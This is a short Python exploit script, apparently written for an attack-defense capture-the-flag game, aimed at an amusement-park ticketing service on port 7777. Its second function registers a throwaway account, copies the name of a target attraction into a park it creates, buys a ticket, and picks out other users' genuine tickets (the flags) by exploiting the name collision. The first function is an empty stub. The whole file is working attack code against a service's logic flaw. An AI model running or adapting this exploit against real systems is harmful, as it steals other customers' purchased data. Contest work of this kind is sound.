from client import Client
from data import get_random_creds, get_park_request
from models import RegisterRequest, AddAttractionRequest
from pretty_client import PrettyClient


def first_sploit(hostname, user_id):
    client = PrettyClient(Client(hostname, 7777))
    pass


def second_sploit(hostname, park_id, attraction_id):
    client = PrettyClient(Client(hostname, 7777))

    login, password = get_random_creds()
    register_request = RegisterRequest(login=login, password=password, document="13")
    user_id = client.register_and_login(register_request)

    parks = client.get_last_parks()
    park = [x for x in parks.parks if x.id == park_id][0]
    attraction_name = [x for x in park.attractions if x.id == attraction_id][0].name

    created_park_id = client.create_park(get_park_request(False))
    add_attraction_request = AddAttractionRequest(name=attraction_name, description="1", cost=1, ticket="faked_ticket")
    added_attraction = client.add_attraction(created_park_id, add_attraction_request)

    user = client.buy_ticket(added_attraction.id, user_id)
    flags = [x for x in user.purchasesInfo.purchases if x.name == attraction_name and x.ticket != "faked_ticket"]
    return flags


def main():
    print(second_sploit("localhost", "d58ad940-831f-43af-977f-cc673580514c", "b8e7253c-8310-4711-b057-345defa85b5b"))


if __name__ == "__main__":
    main()
